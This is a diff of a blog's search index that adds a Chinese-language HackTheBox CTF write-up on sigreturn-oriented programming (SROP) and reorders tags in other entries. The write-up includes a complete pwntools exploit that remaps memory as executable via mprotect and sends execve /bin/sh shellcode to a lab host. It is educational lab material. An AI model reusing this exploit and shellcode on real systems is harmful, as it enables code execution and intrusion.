class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>ROP</tag>
+        <tag>pwn</tag>
+        <tag>Stack Migration</tag>
+        <tag>x86_64</tag>
+        <tag>x86</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Sick ROP on HackTheBox / SROP</title>
+    <url>/2024/04/23/sickrop-htb/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><h3 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h3><p>SROP &#x3D; Sigreturn Oriented Programming<br>一支程式如果接到signal，它會把寄存器值存到stack上，這叫signal frame<br>而這些資料被處裡完後需要透過<code>__restore_rt</code>的函數去做<code>return</code>進行真的存取，也就是<a href="https://syscalls.w3challs.com/?arch=x86_64">syscall table</a>上面<code>0xf</code>的syscall<code>rt_sigreturn</code><br>利用場景主要就在ROP GADGET非常不足時…  </p>
+<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p><strong>checksec</strong><br><img src="https://hackmd.io/_uploads/BJataEH-0.png" alt="image">  </p>
+<p><strong>ROPgadget</strong><br><img src="https://hackmd.io/_uploads/ByNdpErWC.png" alt="image">  </p>
+<p><strong>radare2</strong><br><img src="https://hackmd.io/_uploads/rkCs6VBW0.png" alt="image">  </p>
+<p>可以發現很缺少ROP CHAIN, 程式本身只有開nx的防護，可以利用syscall table裡面的<code>mprotect</code>(就是<code>0xa</code>)進行資料段改權限。  </p>
+<p>幾個觀察點：<br>RAX的值會隨著輸入長度+1(因為會算上換行)而改變  </p>
+<p>找可寫入的地址：(with gdb-peda vmmap)<br><img src="https://hackmd.io/_uploads/B15JJBr-0.png" alt="image">  </p>
+<p>syscall 時需要呼叫回去vuln的函數，找一個指向它地址的指標：<br><img src="https://hackmd.io/_uploads/rJRWkSSW0.png" alt="image">  </p>
+<p>就可以湊出利用 Sigreturn 改寫權限的 signal frame：  </p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">writable = <span class="number">0x400000</span></span><br><span class="line">frame = SigreturnFrame(kernel=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">frame.rax = <span class="number">10</span></span><br><span class="line">frame.rdi = writable</span><br><span class="line">frame.rsi = <span class="number">0x40000</span> <span class="comment"># size</span></span><br><span class="line">frame.rdx = <span class="number">7</span> <span class="comment">### r/w/x</span></span><br><span class="line">frame.rsp = vuln_pointer</span><br><span class="line">frame.rip = syscall</span><br></pre></td></tr></table></figure>
+
+<p>最後改寫成功就可以繞調 NX 防護，然後進行一般的 RET 2 SHELLCODE!!!  </p>
+<p>完整腳本：  </p>
+<p>Exploit.py  </p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#r=process(&#x27;./sick_rop&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&#x27;83.136.255.150&#x27;</span>, <span class="number">52277</span>)</span><br><span class="line">rop=ROP(<span class="string">&#x27;./sick_rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line"></span><br><span class="line">vuln=<span class="number">0x0040102e</span></span><br><span class="line">vuln_pointer=<span class="number">0x4010d8</span></span><br><span class="line">shellcode=<span class="string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span></span><br><span class="line">syscall=rop.syscall[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># sig payload</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## NX bypass</span></span><br><span class="line">writable = <span class="number">0x400000</span></span><br><span class="line">frame = SigreturnFrame(kernel=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">frame.rax = <span class="number">10</span></span><br><span class="line">frame.rdi = writable</span><br><span class="line">frame.rsi = <span class="number">0x40000</span></span><br><span class="line">frame.rdx = <span class="number">7</span> <span class="comment">### r/w/x</span></span><br><span class="line">frame.rsp = vuln_pointer</span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line"><span class="comment"># exploit</span></span><br><span class="line">payload1=<span class="string">b&#x27;w&#x27;</span>*<span class="number">40</span>+flat(vuln, syscall)+<span class="built_in">bytes</span>(frame)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">b&#x27;w&#x27;</span>*<span class="number">14</span>)</span><br><span class="line">r.recv()</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">payload2=shellcode+<span class="string">b&#x27;w&#x27;</span>*<span class="number">17</span>+p64(<span class="number">0x4010b8</span>)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/HyrLkSBZ0.png" alt="image">  </p>
+<p>p.s.中間有利用pwntools的gdb看過return address<br><img src="https://hackmd.io/_uploads/HJjwyHSZA.png" alt="image">  </p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>HackTheBox</tag>
+        <tag>pwn</tag>
+        <tag>SROP</tag>
       </tags>
   </entry>
   <entry>
@@ -2306,12 +2306,12 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
 <h3 id="Robot-Assembly-Line"><a href="#Robot-Assembly-Line" class="headerlink" title="Robot Assembly Line"></a>Robot Assembly Line</h3><hr>
 ]]></content>
       <tags>
-        <tag>pwn</tag>
         <tag>CTF</tag>
-        <tag>ROP</tag>
         <tag>Cryptography</tag>
         <tag>Web Security</tag>
+        <tag>ROP</tag>
         <tag>WAN</tag>
+        <tag>pwn</tag>
         <tag>Classical cipher</tag>
         <tag>GOT Hijacking</tag>
         <tag>SunShine CTF</tag>
@@ -2345,8 +2345,8 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
 <h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>今天晚上還會再打一台麻~<br>挑題easy的練手感(?)  </p>
 ]]></content>
       <tags>
-        <tag>HackTheBox</tag>
         <tag>Pentesting</tag>
+        <tag>HackTheBox</tag>
       </tags>
   </entry>
   <entry>
@@ -2554,8 +2554,8 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
 <p>第2048名超酷</p>
 ]]></content>
       <tags>
-        <tag>HackTheBox</tag>
         <tag>Pentesting</tag>
+        <tag>HackTheBox</tag>
         <tag>Wifi</tag>
       </tags>
   </entry>
